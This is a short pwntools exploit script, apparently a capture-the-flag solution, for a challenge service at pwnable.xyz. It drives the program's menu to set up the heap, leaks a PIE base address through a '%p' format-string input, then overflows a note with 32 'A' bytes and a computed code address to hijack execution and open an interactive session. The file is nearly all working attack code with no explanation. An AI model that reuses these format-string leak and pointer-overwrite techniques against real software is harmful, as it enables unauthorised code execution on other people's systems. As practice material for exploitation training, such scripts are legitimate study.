from pwn import *


#sh = process('./challenge')
sh = remote('svc.pwnable.xyz', 30043)
# easy heap exploitation guys 
# gg let's go fuck it 
pause()
sh.sendlineafter('Exit\n', '1')
pause()
sh.sendlineafter(': ', '10 0')
sh.sendlineafter(': ', '8')
sh.sendlineafter(': ', 'a')
sleep(3)
pause()
sh.sendlineafter('Exit\n', '3')
pause()
sh.sendlineafter('Exit\n', '3')

sh.sendlineafter('Exit\n', '1')
sh.sendlineafter(': ', '1 1')
sh.sendlineafter(': ', '250')
sh.sendlineafter(': ', '1 2')
sh.sendlineafter(': ', '250')
sh.sendlineafter(': ', '1 3')
sh.sendlineafter(': ', '250')
sh.sendlineafter(': ', '1 4')
sh.sendlineafter(': ', '250')
sh.sendlineafter(': ', '1 4')
sh.sendlineafter(': ', '250')
sh.sendlineafter(': ', '1 4')
sh.sendlineafter(': ', '250')

sh.sendlineafter(': ', 'a')
sh.sendlineafter(': ', "A")
sh.sendlineafter(': ', '%p %p %p %p %p %p %p')

sleep(2)
sh.sendline('2')
sh.recvuntil('A - 3\n\t')
pie_addr = int(sh.recvline()[49:63], 16) - 0xb80
print "pie addr = ", hex(pie_addr)








#send note
sleep(2)
sh.sendline('4')
sh.sendlineafter(': ', 'A'*0x20 + p64(pie_addr + 0x19fe))


#sh.sendlineafter('Exit\n', '2')
sh.interactive()
